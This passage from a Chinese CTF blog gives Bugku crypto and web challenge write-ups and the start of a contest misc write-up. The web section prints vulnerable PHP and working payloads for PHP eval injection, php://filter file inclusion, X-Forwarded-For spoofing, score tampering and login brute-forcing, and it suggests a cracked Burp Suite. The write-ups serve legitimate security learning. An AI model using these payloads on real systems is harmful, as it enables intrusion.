你以为是md5吗</h4><blockquote><p>bci177a7a9c7udf69c248647b4dfc6fd84o 是又不是就是玩</p></blockquote><p>确实是md5，但是md5是16进制的包含0到9和a到f一共16个字符，这道题给的包含了超出f的字符，删去这一部分就能得到正确的编码。解码可得结果。不得不说真的666666啊。</p><h4 id="6-这不是md5"><a href="#6-这不是md5" class="headerlink" title="6 这不是md5"></a>6 这不是md5</h4><p>说实话这道题还真不是md5，就是一段16进制数，直接转文本就行<strong>flag{ae73587ba56baef5}</strong></p><h4 id="7-一段base64"><a href="#7-一段base64" class="headerlink" title="7 一段base64"></a>7 一段base64</h4><p>这段base64还真是够长的，用在线解题工具已经不能将其解码了。不过还是可以利用工具converter进行解码。得道形如\134\170\65\143\134\170\67\65 的一段编码。百度得知是unescape编码。继续进项解码得到形如\x5c\x75\x30\x30\x35的编码这一部分还清楚是hex编码。将他转化为text。得到一堆我又不认识的密码。。。<br>结果看了下别人的解题他们告诉我这还是unescape，继续解码发现<strong>String.fromCharCode</strong>根据大佬的介绍这是JavaScript的函数，[]内的是里面的参数。然后将这一些删去对数字就是一种dec密码。继续解码。得到decode编码。继续解码。得到Unicode编码.编码可得。</p><blockquote><p>&#102;&#108;&#97;&#103;&#37;&#55;&#66;&#99;&#116;&#102;&#95;&#116;&#102;&#99;&#50;&#48;&#49;&#55;&#49;&#55;&#113;&#119;&#101;&#37;&#55;&#68;</p></blockquote><p>其中%7b是 <strong>{</strong> ，%7d是 **}**。<br>得到flag。这道做的时候是转的最晕的一次，使用的密码太多了。</p><h4 id="8-base家族"><a href="#8-base家族" class="headerlink" title="8 base家族"></a>8 base家族</h4><p>这确实不是base64，不是base32，不是base16.这是神奇的base91…….</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;554a5058c9021c76&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="9-把猪困在猪圈里"><a href="#9-把猪困在猪圈里" class="headerlink" title="9 把猪困在猪圈里"></a>9 把猪困在猪圈里</h4><p>题目提示的很清楚是与猪圈密码有关。打开是一段base64编码，我们知道猪圈密码是一堆特殊符号。这就很有可能是要将base64密码转为图片。在文本最前方加上data:image/jpg;base64,然后用在线工具编码出对应图片。<br><img src="https://upload-images.jianshu.io/upload_images/24919094-c63759746f45889a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>就是这个，对应解码得到<strong>flag{thisispigpassword}</strong></p><blockquote><p>由于比较忙碌这个解题，包括之前的web和之后写的杂项都会持续更新的。</p></blockquote><h4 id="10"><a href="#10" class="headerlink" title="10 .!?"></a>10 .!?</h4><p>这像不像前面的okk，实际上这就是一种变形的okk密码，省略okk只使用.!?进行描述。用在线工具解题即可获得flag。</p><h4 id="11-散乱的密码"><a href="#11-散乱的密码" class="headerlink" title="11 散乱的密码"></a>11 散乱的密码</h4><p>看这个题第一眼以为是栅栏密码，但又有2 1 6 5 3 4这样的提示，这让我想到了ADFGX密码。仔细一数 lf5{ag024c483549d7fd@@1}一共24个数，216534一共六个数。盲猜是变形对ADFGX，将每六个作为一组，按照216534的顺序进行排列。最后删去@@得到flag。</p><h4 id="12-EN-气泡"><a href="#12-EN-气泡" class="headerlink" title="12 EN-气泡"></a>12 EN-气泡</h4><p>提示的很清楚气泡，Bubble。这就是一串BubbleBubble密码。对文件多次解码得到flag。</p><h4 id="13-简单加密"><a href="#13-简单加密" class="headerlink" title="13 简单加密"></a>13 简单加密</h4><p>题目信息里的AA实际上是提示，这个本质上是一个凯撒移位，但是凯撒移位是对字母进行移位，而这个是包含了字母数字和特殊符号。无法使用现成的工具。<br>写一个脚本。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">text <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入题目密文"</span><span class="token punctuation">)</span>text1<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> text<span class="token punctuation">:</span>    t<span class="token operator">=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span>    text1<span class="token operator">+=</span>t<span class="token keyword">print</span><span class="token punctuation">(</span>text1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将字符进行移位得到a2V5ezY4NzQzMDAwNjUwMTczMjMwZTRhNThlZTE1M2M2OGU4fQ==，明显是base64密码，解码得flag。</p><h4 id="14-来自宇宙的信号"><a href="#14-来自宇宙的信号" class="headerlink" title="14 来自宇宙的信号"></a>14 来自宇宙的信号</h4><p>下载下来是一张图片，评论区告诉我这是标准银河字母（Standard Galactic Alphabet）出自《<a href="https://baike.baidu.com/item/%E6%8C%87%E6%8C%A5%E5%AE%98%E5%9F%BA%E6%81%A9/10345602">指挥官基恩</a>》系列。后面又了解了下，突然发现这东西还是MC的附魔符号，感觉这么多年的我的世界白玩了。</p><h4 id="15-告诉你一个秘密。"><a href="#15-告诉你一个秘密。" class="headerlink" title="15 告诉你一个秘密。"></a>15 告诉你一个秘密。</h4><blockquote><p>636A56355279427363446C4A49454A7154534230526D6843 56445A31614342354E326C4B4946467A5769426961453067</p></blockquote><p>嗯这像是16进制数也像MD5，MD5解密什么都没有得到，使用16进制转字符串得到cjV5RyBscDlJIEJqTSB0RmhCVDZ1aCB5N2lKIFFzWiBiaE0g，用base64进行编码得到</p><pre class="line-numbers language-none"><code class="language-none">r5yG lp9I BjM tFhBT6uh y7iJ QsZ bhM <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>评论区有人告诉我们，这是键盘码，</p><blockquote><p>键盘密码应该不算是一种加密算法，但是一种有趣的设置密码方式。<br>他就是a-z(A-Z)对应成键盘上的字母，把键盘字母一行一行的对应即可。<br>例如被r5yg几个字母包围的是t。</p></blockquote><p>得到flag，注意最后的密码需要大写。</p><h4 id="16-小山丘的秘密"><a href="#16-小山丘的秘密" class="headerlink" title="16 小山丘的秘密"></a>16 小山丘的秘密</h4><p>hill能有什么秘密呢，Hill Cipher正是希尔密码，观察图片，希尔密码需要秘钥字母表，密钥肯定就在图片中,图片看上去4和9的位置看上去像是缺了棋子，那么将它看作0，那么此处位置为 z ，其他位置如图所示，得到密钥<br><img src="https://upload-images.jianshu.io/upload_images/24919094-df5120eed9bd6250.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p><p>将其作为秘钥abczadefz<br>同时我们知道提示中他说A=1，我们要让密码表中Z=0，a=1；<br>将PLGTGBQHM小写进行解码，得到whatahill。扩上{}得到flag。</p><h4 id="17-你喜欢下棋吗"><a href="#17-你喜欢下棋吗" class="headerlink" title="17 你喜欢下棋吗"></a>17 你喜欢下棋吗</h4><p>题干很清楚下棋，这个是波利比奥斯方阵密码，也叫棋盘密码。使用在线工具解码得到thisispolybius。这是txt文件的解压密码。</p><blockquote><p>一种5bit的编码<br>bugku{11111 11001 00011 00111 01001 11011 10110 11111 10000 01110 11011 10110 11111 01001 00001}</p></blockquote><p>评论区告诉我这是博多电码解码，好家伙出题人你做个人吧。<br>博多电码太过于古老，导致都没什么现成的公具。<a href="https://www.dcode.fr/baudot-code%E8%BF%99%E6%98%AF%E8%AF%84%E8%AE%BA%E5%8C%BA%E5%A4%A7%E4%BD%AC%E7%BB%99%E7%9A%84%E8%A7%A3%E7%A0%81%E7%BD%91%E5%9D%80%E3%80%82%E8%BF%98%E6%9C%89%E5%87%A0%E4%B8%AA%E7%BD%91%E5%9D%80%EF%BC%8C%E4%BD%86%E5%9B%A0%E4%B8%BA%E5%90%84%E7%A7%8D%E5%90%84%E6%A0%B7%E7%9A%84%E5%8E%9F%E5%9B%A0%E8%BF%9B%E4%B8%8D%E5%8E%BB%E3%80%82%E3%80%82%E3%80%82">https://www.dcode.fr/baudot-code这是评论区大佬给的解码网址。还有几个网址，但因为各种各样的原因进不去。。。</a><br>解码得到flag</p><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUGKU靶场解题记录之web</title>
      <link href="/2021/10/03/BUGKU%E9%9D%B6%E5%9C%BA%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95%E4%B9%8Bweb/"/>
      <url>/2021/10/03/BUGKU%E9%9D%B6%E5%9C%BA%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95%E4%B9%8Bweb/</url>
      
        <content type="html"><![CDATA[<h4><center>前言：</center></h4>> 学习CTF已经有一段时间了，陆陆续续也做了不少题。为了准备前段时间的全国大学生信息安全大赛，又把许多题目重新看过一遍。现在也终于闲下来一两天，正好趁这个机会把在bugku靶场做出的题目整理一下。<hr><h6 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h6><p>打开看到一大堆滑稽，F12查看网页源代码就能发现flag，明显的送分题。</p><h6 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h6><p> 题目描述输入验证码即可得到flag，正常输入发现只能输入1位，F12，将maxlength=”1”改为maxlength=”2”即可正确输入,得到flag。还是送分题。</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;ea008b7aaab0d3ea27c8580df13f52c3&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h5><p>根据题意构造url即可得到flag</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;114.67.246.176:14287&#x2F;?what&#x3D;flagflag&#123;45240136ecbcb3c6db9d1dcb756ced4b&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h6 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h6><p>跟上一道题类似，只不过这次是post，使用Firefox插架Max HackBar输入what=flag得到flag</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;1e7a6931002d229ac37085a846d21e6d&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h6 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h6><p>题目描述<strong>矛盾</strong>，打开链接看到相应php代码描述。if=($num==1) 意思就是num等于数字1就会打印flag 但是is_numeric函数检测数字意味着，<strong>既要是数字1，又不能是数字。</strong><br>在评论区有这个介绍。</p><blockquote><p>PHP一个数字和一个字符串进行比较或者进行运算时，PHP会把字符串转换成数字再进行比较。PHP转换的规则的是：若字符串以数字开头，则取开头数字作为转换结果，若无则输出0。 在PHP中，== 会先进行类型转换，再进行对比，而===会先比较类型，如果类型不同直接返回不相等。</p></blockquote><p>题目中正好使用的是==号我们可以构造类似1a的数字加字母的组合。<br>构建url得到flag：<br><em>flag{2b16dd84ae5d35c74fe16c759849b871}</em></p><h6 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h6><p>直接查看网页源代码，得到unicode编码解码得到相flag。<br> <strong>flag{f41c9ed6534a088591cfc7cb118d8b46}</strong></p><h6 id="web7-你必须让他停下来"><a href="#web7-你必须让他停下来" class="headerlink" title="web7 你必须让他停下来"></a>web7 你必须让他停下来</h6><p>右键查看源代码，然后一直刷新源代码的页面，就能得到flag，当然有burpsuit抓包，然后sendtorepeter，一直send也一样，在第10张jpg的响应里边就有flag.<br>这两种方法本质上是一样的。</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;222c6ea6e3f1b78d0e47688932d6c097&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在补充一点提交flag时要记得把代理关上。</p><h6 id="web8-文件包含"><a href="#web8-文件包含" class="headerlink" title="web8 文件包含"></a>web8 文件包含</h6><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>    <span class="token variable">$a</span> <span class="token operator">=</span> @<span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hello'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">"var_dump(<span class="token interpolation"><span class="token variable">$a</span></span>);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>审计PHP代码得到以下信息。</p><blockquote><p>request函数表明可以任选get或post方法提交<br>helloeval() 函数把字符串按照 PHP 代码来执行<br>show_source用来返回文件内容<br>include函数会将flag.php包含在该文件中</p></blockquote><p>由此我们可以构建url <strong>/?hello=show_source(‘flag.php’)<strong>或者</strong>?hello=file(‘flag.php’)<strong>均能得到flag。</strong>flag{e5d1a21b2cf1819415ce4ba106e868d9}</strong></p><h6 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h6><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"flag1.php"</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$args</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/^\w+$/"</span><span class="token punctuation">,</span><span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"args error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"var_dump(<span class="token interpolation"><span class="token variable">$$args</span></span>);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">?</span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>php代码实际上就是最大的提示。</p><blockquote><p>flag in the variable：提示flag在变量里面<br>preg_match：使用正则表达式匹配，/^\w+$/ 表明只能输入数字和英文字母及下划线<br>说明此时只能用全局变量查看GLOBALS</p></blockquote><p>构造?args=GLOBALS得到flag：<br><em>flag{6ee63ee40bbaf7d0992a373217f73f43}</em></p><h6 id="web10-头等舱"><a href="#web10-头等舱" class="headerlink" title="web10 头等舱"></a>web10 头等舱</h6><p>我觉得这道题真的是送分的，F12查看网络在响应头里就能得到flag。当然抓包也一样但是麻烦了。</p><h6 id="web-11-网站被黑"><a href="#web-11-网站被黑" class="headerlink" title="web 11 网站被黑"></a>web 11 网站被黑</h6><blockquote><p> 描　　述: 网站被黑了 黑客会不会留下后门 </p></blockquote><p>既然提示了后门的存在就用，扫描工具扫描下。利用御剑扫描，扫出来两个.php一个是那个黑页，另一个是一张登录界面。<br><img src="https://upload-images.jianshu.io/upload_images/24919094-ff37e575621d6bc1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>在得到网址后进项抓包，直接用burp suit自带的爆破功能爆破下就OK了。（注burp suite的社区版爆破功能好像不是很全，推荐去找一个别人破解的专业版）<br><img src="https://upload-images.jianshu.io/upload_images/24919094-fea2aa6bcd261fd2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p><h6 id="web-12-本地管理员"><a href="#web-12-本地管理员" class="headerlink" title="web 12 本地管理员"></a>web 12 本地管理员</h6><p>查看网页源代码在一堆n后面有个base64，解码得到管理员密码，账户盲猜admin登录，提示IP禁止访问，请联系本地管理员登陆，IP已被记录.使用本地管理员登录，就要进行IP伪造，编辑消息头，X-Forwarded-For:127.0.0.1。得到flag</p><h6 id="game1"><a href="#game1" class="headerlink" title="game1"></a>game1</h6><p>一道游戏题，正常来说游戏应该是杂项吧，这一次的游戏题有一说一竟然让我忘了我是来做题的。<br>在评论区得到大佬的提示，这一道游戏题分数上限是99999，使用burp suite抓包，在最后出成绩时能看到</p><blockquote><p>GET /score.php?score=200&amp;ip=223.104.190.201&amp;sign=zMMjAw== HTTP/1.1</p></blockquote><p>sign=zMMjAw像是base64加密，但是直接解算不出来，多玩几次游戏，发现zM是一直都有的，对后面的部分解码正是游戏得到的分数。构造url</p><blockquote><p>score.php?score=99999&amp;ip=223.104.190.201&amp;sign=zMOTk5OTk==</p></blockquote><p>得到flag。<em>flag{78544bfa1e21dcf4dcbd7488870b267f}</em></p><h6 id="web13-看看源码吧"><a href="#web13-看看源码吧" class="headerlink" title="web13 看看源码吧"></a>web13 看看源码吧</h6><pre class="line-numbers language-none"><code class="language-none">var p1 &#x3D; &#39;%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62&#39;;var p2 &#x3D; &#39;%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b&#39;;eval(unescape(p1) + unescape(&#39;%35%34%61%61%32&#39; + p2));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>使用<a href="http://tool.chinaz.com/tools/urlencode.aspx">在线工具解码</a>得到三段url按照要求进行拼接</p><blockquote><p>function checkSubmit(){var a=document.getElementById(“password”);if(“undefined”!=typeof a){if(“67d709b2b54aa2aa648cf6e87a7114f1”==a.value)return!0;alert(“Error”);a.focus();return!1}}document.getElementById(“levelQuest”).onsubmit=checkSubmit;</p></blockquote><p>中间那一段就是要在网页上提交的东西,提交得到flag；</p><blockquote><p>flag{f51a5a7335f538b979ac5eaf43e4cad6}</p></blockquote><h6 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h6><p>怎么说呢？这道题考察了<a href="https://blog.csdn.net/qq_32393893/article/details/110228864">文件包含&amp;PHP伪协议</a>这个作者整理的很好，可以去借鉴借鉴。<br>构造一个url</p><blockquote><p>php?file=php://filter/read=convert.base64-encode/resource=index.php<br>读取目标服务器文件内容，并讲这些内容进行base64编码，我们只需要解码就可以了。</p></blockquote><pre class="line-numbers language-none"><code class="language-none">DQogICAgDQo8P3BocA0KCWVycm9yX3JlcG9ydGluZygwKTsNCglpZighJF9HRVRbZmlsZV0pe2VjaG8gJzxhIGhyZWY9Ii4vaW5kZXgucGhwP2ZpbGU9c2hvdy5waHAiPmNsaWNrIG1lPyBubzwvYT4nO30NCgkkZmlsZT0kX0dFVFsnZmlsZSddOw0KCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpew0KCQllY2hvICJPaCBubyEiOw0KCQlleGl0KCk7DQoJfQ0KCWluY2x1ZGUoJGZpbGUpOyANCi8vZmxhZzpmbGFne2U4M2VlOWM2YWY5MjdkYWFmMjAyMTExNjE1ZWJjOWYxfQ0KPz4NCjwvaHRtbD4NCg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对着一长串进行解码得到</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phperror_reporting(0);if(!$_GET[file])&#123;echo &#39;&lt;a href&#x3D;&quot;.&#x2F;index.php?file&#x3D;show.php&quot;&gt;click me? no&lt;&#x2F;a&gt;&#39;;&#125;$file&#x3D;$_GET[&#39;file&#39;];if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;echo &quot;Oh no!&quot;;exit();&#125;include($file); &#x2F;&#x2F;flag:flag&#123;e83ee9c6af927daaf202111615ebc9f1&#125;?&gt;&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到flag。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Bugku </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浙江工业大学秋季挑战赛wp</title>
      <link href="/2021/10/03/DASCTF%20X%20%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B/"/>
      <url>/2021/10/03/DASCTF%20X%20%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="浙江工业大学秋季挑战赛wp"><a href="#浙江工业大学秋季挑战赛wp" class="headerlink" title="浙江工业大学秋季挑战赛wp"></a>浙江工业大学秋季挑战赛wp</h1><p>[TOC]</p><p>这个比赛当天一共有三个比赛要打，这个我们就随便参与一下，做了<code>科技节</code>的比赛，还有NISP。下午正好还是我们学校的汇演，就一共拿出来了一个小时做这东西。最后就出了一道杂项，现在倒是有时间看看，顺手整合下网络上有点wp</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Girlfriend’s-account"><a href="#Girlfriend’s-account" class="headerlink" title="Girlfriend’s account"></a>Girlfriend’s account</h3><p>jackie的女朋友又偷偷用他的信用卡买东西了，你能算算一共花了多少钱吗？ 我自己的做法是用WPS的大写数字转数字的功能，用哪个做出来了这道题目。在比赛后复盘看了一些大佬的WP，其中白嫖来一个脚本。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">import</span> xlrddata<span class="token operator">=</span>xlrd<span class="token punctuation">.</span>open_workbook<span class="token punctuation">(</span><span class="token string">"D:\webtest\information.xls"</span><span class="token punctuation">)</span>table <span class="token operator">=</span> data<span class="token punctuation">.</span>sheets<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>nrows <span class="token operator">=</span> table<span class="token punctuation">.</span>nrowsprice<span class="token operator">=</span>table<span class="token punctuation">.</span>col_values<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> start_rowx<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> end_rowx<span class="token operator">=</span><span class="token number">5001</span><span class="token punctuation">)</span>number<span class="token operator">=</span>table<span class="token punctuation">.</span>col_values<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> start_rowx<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> end_rowx<span class="token operator">=</span><span class="token number">5001</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">num_change</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> num<span class="token operator">==</span><span class="token string">'零'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> num<span class="token operator">==</span><span class="token string">'壹'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> num<span class="token operator">==</span><span class="token string">'贰'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> num<span class="token operator">==</span><span class="token string">'叁'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> num<span class="token operator">==</span><span class="token string">'肆'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">4</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> num<span class="token operator">==</span><span class="token string">'陆'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">6</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> num<span class="token operator">==</span><span class="token string">'伍'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">5</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> num<span class="token operator">==</span><span class="token string">'柒'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">7</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> num<span class="token operator">==</span><span class="token string">'捌'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> num<span class="token operator">==</span><span class="token string">'玖'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">9</span><span class="token punctuation">;</span><span class="token keyword">def</span> <span class="token function">aoligeiganle</span><span class="token punctuation">(</span>amount<span class="token punctuation">)</span><span class="token punctuation">:</span>    chinese_num <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'零'</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'壹'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'贰'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'叁'</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'肆'</span><span class="token punctuation">:</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'伍'</span><span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'陆'</span><span class="token punctuation">:</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token string">'柒'</span><span class="token punctuation">:</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token string">'捌'</span><span class="token punctuation">:</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'玖'</span><span class="token punctuation">:</span> <span class="token number">9</span><span class="token punctuation">&#125;</span>    chinese_amount <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'分'</span><span class="token punctuation">:</span> <span class="token number">0.01</span><span class="token punctuation">,</span> <span class="token string">'角'</span><span class="token punctuation">:</span> <span class="token number">0.1</span><span class="token punctuation">,</span> <span class="token string">'元'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'拾'</span><span class="token punctuation">:</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token string">'佰'</span><span class="token punctuation">:</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token string">'仟'</span><span class="token punctuation">:</span> <span class="token number">1000</span><span class="token punctuation">,</span> <span class="token string">'圆'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">&#125;</span>    amount_float <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">if</span> <span class="token string">'亿'</span> <span class="token keyword">in</span> amount<span class="token punctuation">:</span>        yi <span class="token operator">=</span> re<span class="token punctuation">.</span>match<span class="token punctuation">(</span><span class="token string">r'(.+)亿.*'</span><span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        amount_yi <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> chinese_amount<span class="token punctuation">:</span>            <span class="token keyword">if</span> i <span class="token keyword">in</span> yi<span class="token punctuation">:</span>                amount_yi <span class="token operator">+=</span> chinese_num<span class="token punctuation">[</span>yi<span class="token punctuation">[</span>yi<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">*</span> chinese_amount<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        <span class="token keyword">if</span> yi<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">in</span> chinese_num<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token 